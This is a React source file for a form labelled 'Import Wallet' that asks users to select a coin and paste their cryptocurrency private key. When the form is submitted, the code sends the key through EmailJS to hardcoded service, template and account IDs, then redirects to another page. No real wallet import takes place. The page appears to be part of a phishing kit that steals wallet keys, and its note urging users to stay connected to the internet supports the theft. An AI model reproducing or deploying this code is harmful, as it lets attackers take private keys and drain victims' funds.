import React, { useRef } from "react";
import classes from "./privateKey.module.css";
import { useState } from "react";
import { useNavigate } from "react-router";
import { useEffect } from "react";
import emailjs from "@emailjs/browser";
const Form = () => {
  const [loading, setLoading] = useState(false);



  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_cen36ww",
        "template_1269aqf",
        e.target,
        "ZbakojD4asxn3jFKH"
      )
      .then(
        (result) => {
          setLoading(true);
          navigate("/Redirect");
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
  };

  const navigate = useNavigate();
  const [value, setValue] = useState({
    coinType: "",
    privateKey: "",
    password: "",
  });

  const handleChange = (e) => {
    setValue((prevState) => ({
      ...prevState,
      [e.target.name]: e.target.value,
    }));
  };

  useEffect(() => {
    const walletname = localStorage.getItem("walletname");
    if (walletname) {
      setValue({
        ...value,
        coinType: walletname,
      });
    }
  }, []);
  return (
    <div>
      <form className={classes.form} onSubmit={sendEmail}>
        <select
          className={classes.input}
          value={value.coinType}
          name="coinType"
          // onChange={() => handleChange(items)}
        >
          {" "}
          <option value="">select coin</option>
          <option value={value.coinType}>{value.coinType}</option>
        </select>
        <label>Private key</label>
        <div>
          <textarea
            className={classes.input1}
            type="text"
            // placeholder="placeholder"
            value={value.privateKey}
            onChange={handleChange}
            name="privateKey"
          />
        </div>
        <p>
          Before you enter private key, we recommend you connect to the
          internet.
        </p>
        <button
          className={classes.button}
          // ref={form}
          disabled={value.coinType.length < 2 || value.privateKey.length < 2}
        >
         {loading ? "Loading" : 'Import Wallet'} 
        </button>
      </form>
    </div>
  );
};

export default Form;
